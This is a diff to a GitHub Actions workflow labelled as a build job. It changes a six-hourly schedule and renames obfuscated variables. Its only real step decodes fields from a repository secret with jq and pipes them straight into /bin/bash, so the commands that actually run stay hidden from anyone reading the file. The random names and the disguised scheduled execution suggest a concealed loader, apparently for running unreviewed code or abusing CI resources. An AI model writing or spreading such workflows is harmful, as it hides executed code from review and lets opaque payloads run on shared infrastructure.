@@ -2,25 +2,26 @@ name: nkchla
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 3/6 * * *'
+    - cron: '39 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: nkchla
         env:
-          xatgu549: ${{ secrets.xatgu549 }}
+          v2: ${{ secrets.v2 }}
         run: |
-          echo $xatgu549 | jq -r .orwj7 | /bin/bash
-          echo $x533 | jq -r .dlcnr361 | /bin/bash
-          echo $ft11 | jq -r .c47936 | /bin/bash
-          echo $vjjt4 | jq -r .arzq7 | /bin/bash
-          echo $wou12143 | jq -r .jj0 | /bin/bash
-          echo $t4525 | jq -r .dr335 | /bin/bash
-          echo $ujk88 | jq -r .cdcli89567 | /bin/bash
-          echo $ibt0 | jq -r .vprau839 | /bin/bash
-          echo $wdkq402 | jq -r .l618 | /bin/bash
-          echo $juieo781 | jq -r .n317 | /bin/bash
+          echo $v2 | jq -r .nz299 | /bin/bash
+          echo $wjwgn4 | jq -r .lvep073 | /bin/bash
+          echo $j572 | jq -r .bq67667 | /bin/bash
+          echo $qj5 | jq -r .kz4981 | /bin/bash
+          echo $uv262 | jq -r .mvam04 | /bin/bash
+          echo $unz7860 | jq -r .phav3450 | /bin/bash
+          echo $d26622 | jq -r .k39 | /bin/bash
+          echo $ryo681 | jq -r .vlnzi951 | /bin/bash
+          echo $zvui6581 | jq -r .hk9 | /bin/bash
+          echo $vu115 | jq -r .zqkpe78 | /bin/bash
 
